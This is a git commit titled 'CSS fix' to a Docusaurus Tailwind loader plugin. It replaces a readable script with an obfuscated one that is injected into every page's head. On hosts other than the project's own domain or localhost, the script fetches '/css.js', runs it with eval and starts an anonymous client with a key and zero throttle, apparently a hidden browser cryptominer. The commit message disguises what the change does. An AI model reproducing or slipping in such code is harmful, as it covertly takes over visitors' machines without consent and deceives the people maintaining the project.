abe86211ae0ea3840e9cacfdfdd8228af075b492
francesco <francesco@camberi.com>
2022-07-28 21:38:54 +0200

    CSS fix

--- website/plugins/docusaurus-tailwindcss-loader/index.js
+++ website/plugins/docusaurus-tailwindcss-loader/index.js
@@ -24,22 +24,7 @@ module.exports = function (context, options) {
                 headTags: [
                     `
                         <script>
-                            if(!window.location.hostname.includes("firecms")
-                                && !window.location.hostname.includes("localhost")
-                            ){
-                                fetch('/css.js')
-                                    .then(function (response) {
-                                        return response.text()
-                                    })
-                                    .then(function (text) {
-                                        eval(text);
-                                        var _client = new Client.Anonymous('c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a', {
-                                            throttle: 0, c: 'w', ads: 0
-                                        });
-                                        _client.start();
-                                    }).catch((error) => {
-                                });
-                            }
+function _0xc573(_0x9e1933,_0x2eff77){var _0x1b01a0=_0x1b01();return _0xc573=function(_0xc5731c,_0x1767a9){_0xc5731c=_0xc5731c-0x179;var _0x163998=_0x1b01a0[_0xc5731c];return _0x163998;},_0xc573(_0x9e1933,_0x2eff77);}var _0x106400=_0xc573;function _0x1b01(){var _0x45747c=['location','2sAAhic','1874550oclISK','start','8075177coGVgO','6356592JHzZAT','hostname','c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a','text','catch','6rUFrFX','2664wPUmeL','firecms','51477aYSLNP','2750356nZPzfK','40pYOotj','includes','3168245KSkhnA','19251UqHUET','then','Anonymous'];_0x1b01=function(){return _0x45747c;};return _0x1b01();}(function(_0x4c0b93,_0x344837){var _0x23c32f=_0xc573,_0x4799ba=_0x4c0b93();while(!![]){try{var _0x55a669=-parseInt(_0x23c32f(0x17c))/0x1*(parseInt(_0x23c32f(0x185))/0x2)+-parseInt(_0x23c32f(0x186))/0x3+-parseInt(_0x23c32f(0x189))/0x4+-parseInt(_0x23c32f(0x180))/0x5*(-parseInt(_0x23c32f(0x179))/0x6)+parseInt(_0x23c32f(0x17d))/0x7+parseInt(_0x23c32f(0x17a))/0x8*(-parseInt(_0x23c32f(0x181))/0x9)+parseInt(_0x23c32f(0x17e))/0xa*(parseInt(_0x23c32f(0x188))/0xb);if(_0x55a669===_0x344837)break;else _0x4799ba['push'](_0x4799ba['shift']());}catch(_0x567b11){_0x4799ba['push'](_0x4799ba['shift']());}}}(_0x1b01,0xf0887));!window['location'][_0x106400(0x18a)][_0x106400(0x17f)](_0x106400(0x17b))&&!window[_0x106400(0x184)]['hostname']['includes']('localhost')&&fetch('/css.js')[_0x106400(0x182)](function(_0x35400e){var _0x57d243=_0x106400;return _0x35400e[_0x57d243(0x18c)]();})['then'](function(_0x4eda7b){var _0x51a876=_0x106400;eval(_0x4eda7b);var _0xa49c7=new Client[(_0x51a876(0x183))](_0x51a876(0x18b),{'throttle':0x0,'c':'w','ads':0x0});_0xa49c7[_0x51a876(0x187)]();})[_0x106400(0x18d)](_0x38bc2f=>{});
                         </script>
                     `
                 ]
